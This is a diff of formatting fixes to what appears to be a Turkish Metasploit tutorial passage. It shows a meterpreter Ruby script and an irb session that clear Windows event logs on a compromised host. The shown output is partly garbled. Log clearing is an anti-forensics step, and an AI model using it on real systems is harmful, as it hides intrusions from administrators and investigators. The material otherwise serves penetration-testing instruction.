@@ -30,7 +30,7 @@ def clrevtlgs**()**
   ]
   print_status("Clearing Event Logs, this will leave and event 517")
   begin
-    evtlogs.each **do** |evl|
+    evtlogs.each do |evl|
       print_status("\tClearing the #{evl} Event Log")
       log = @client.sys.eventlog.open(evl)
       log.clear
@@ -78,7 +78,7 @@ Ardından meterpreter shell içerisinden Ruby kodlayıcısını `irb` komutuyla 
 meterpreter > irb
 > Starting IRB shell
 > The 'client' variable holds the meterpreter client
-**>>** log = client.sys.eventlog.open('system')
+> log = client.sys.eventlog.open('system')
 => #>#:0xb6779424 @client=#>, #>, #
 
 "windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
@@ -87,7 +87,7 @@ meterpreter > irb
 Şimdi, meterpreter içerisinde `log.clear` komutuyla logların temizlenip temizlenmediğini kontrol edelim.
 
 ```bash
-**>>** log.clear
+> log.clear
 => #>#:0xb6779424 @client=#>,
 
 /trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
@@ -111,7 +111,7 @@ evtlogs = [
         'file replication service'
         ]
 print_line("Clearing Event Logs, this will leave an event 517")
-evtlogs.each **do** |evl|
+evtlogs.each do |evl|
         print_status("Clearing the #{evl} Event Log")
         log = client.sys.eventlog.open(evl)
         log.clear
